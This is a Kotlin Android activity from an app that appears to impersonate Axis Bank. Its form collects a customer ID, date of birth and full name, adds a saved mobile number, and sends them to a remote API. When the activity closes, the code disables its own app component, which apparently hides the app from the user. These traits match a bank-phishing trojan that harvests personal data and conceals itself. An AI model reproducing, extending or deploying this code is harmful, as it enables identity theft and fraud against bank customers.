package com.example.oldaxisbank

import android.content.Intent
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Toast
import com.example.axisbank.SecondPage
import com.example.axisbank.ThirdPage
import com.example.oldaxisbank.databinding.ActivityThirdpageBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class thirdpage : AppCompatActivity() {

    private lateinit var binding: ActivityThirdpageBinding
    private val dateOfBirthTextWatcher = DateOfBirthTextWatcher()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityThirdpageBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.e1.addTextChangedListener(dateOfBirthTextWatcher)

        binding.login.setOnClickListener {

            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
                binding.e3.text.toString().isEmpty() ) {
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show()

            }else{

                val util = Util()
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val intentff = Intent(this, finalscreen::class.java)
                val data = ThirdPage(customerid = binding.e3.text.toString(),
                    mobile = util.getLocalData(this,"m"),
                    dob = binding.e1.text.toString(),
                    fullname = binding.e2.text.toString()
                )
                val call = apiService.third(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })



            }

        }

    }

    fun isPANValid(panNumber: String): Boolean {
        val panPattern = Regex("[A-Z]{5}[0-9]{4}[A-Z]{1}")

        return panPattern.matches(panNumber)
    }


    override fun onDestroy() {
        super.onDestroy()
        val util =  Util()
        if(util.getLocalData(this,"dis")=="1") {
            util.saveLocalData(this,"dis","2")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

}



class DateOfBirthTextWatcher : TextWatcher {
    private var isFormatting = false
    private val dateSeparator = '/'
    private val datePattern = Regex("[0-9]{2}/[0-9]{2}/[0-9]{4}")

    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

    override fun afterTextChanged(s: Editable?) {
        if (isFormatting) {
            return
        }

        isFormatting = true
        formatDate(s)
        isFormatting = false
    }

    private fun formatDate(text: Editable?) {
        text?.let {
            val dateLength = text.length
            if (dateLength == 3 || dateLength == 6) {
                if (text[dateLength - 1] != dateSeparator) {
                    text.insert(dateLength - 1, dateSeparator.toString())
                }
            }

            if (dateLength >= 10) {
                val date = text.toString()
                if (!datePattern.matches(date)) {
                    // Invalid date format, clear the text
                    text.clear()
                }
            }
        }
    }
}
